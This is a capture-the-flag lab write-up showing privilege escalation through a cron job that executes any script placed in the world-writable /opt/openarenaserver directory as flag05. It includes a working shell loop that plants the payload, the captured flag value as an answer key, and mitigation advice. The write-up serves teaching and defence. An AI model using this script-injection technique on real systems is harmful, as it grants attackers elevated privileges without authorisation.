
# Level05: Cron Job Script Injection via Writable Directory

## Description
This level demonstrates privilege escalation through a cron job that executes scripts from a world-writable directory. A scheduled task running as the `flag05` user processes and executes all files in `/opt/openarenaserver/`, then deletes them. By placing a malicious script in this directory, an attacker can execute arbitrary commands with `flag05` privileges.

## Discovery Process

1. **Initial reconnaissance:**
   - Upon login, noticed the message "You have new mail"
   - Checked mail for clues:
   ```bash
   cat /var/mail/level05
   ```
   - Found a cron job entry:
   ```
   */2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
   ```
   - Translation: Every 2 minutes, execute `/usr/sbin/openarenaserver` as the `flag05` user

2. **Analyzed the target script:**
   ```bash
   cat /usr/sbin/openarenaserver
   ```
   - Script contents:
   ```bash
   #!/bin/sh
   for i in /opt/openarenaserver/* ; do
       (ulimit -t 5; bash -x "$i")
       rm -f "$i"
   done
   ```
   - Translation: For each file in `/opt/openarenaserver/`, execute it as a bash script (with 5 second timeout), then delete it

3. **Verified directory permissions:**
   ```bash
   ls -la /opt/openarenaserver/
   ```
   - Confirmed the directory is writable by level05 user

## Steps to Exploit

1. **Initial failed attempts:**
   - First attempt using home directory output:
   ```bash
   echo '#!/bin/bash' > /opt/openarenaserver/test
   echo 'getflag > ~/flag05_output' >> /opt/openarenaserver/test
   chmod +x /opt/openarenaserver/test
   ```
   - Failed: `flag05` user lacks write permissions to its home directory

2. **Identified writable output location:**
   - Checked tmp permissions:
   ```bash
   ls -la / | grep tmp
   # Output: d-wx-wx-wx  4 root root  100 Nov 14 09:36 tmp
   ```
   - tmp has write and execute permissions for all users (despite no read permission, direct file access works)

3. **Successful exploitation with loop:**
   ```bash
   while [ ! -f /tmp/flag05_token ]; do
       echo 'getflag > /tmp/flag05_token' > /opt/openarenaserver/x
       chmod +x /opt/openarenaserver/x
       sleep 1
   done
   cat /tmp/flag05_token
   ```
   - Loop continuously creates the exploit script until cron executes it
   - Retrieved flag: `viuaaale9huek52boumoomioc`

## Impact
- Scheduled tasks executing scripts from world-writable directories enable privilege escalation
- Any user can inject malicious code that runs with elevated privileges
- Automated deletion of scripts provides minimal forensic evidence

## Mitigation
1. **Restrict directory permissions:** Ensure script directories used by privileged cron jobs are not world-writable
2. **Validate script sources:** Only execute scripts from trusted, controlled locations with strict ownership checks
3. **Use absolute paths:** Avoid processing arbitrary files; explicitly whitelist allowed scripts
4. **Principle of least privilege:** Run scheduled tasks with minimum necessary permissions
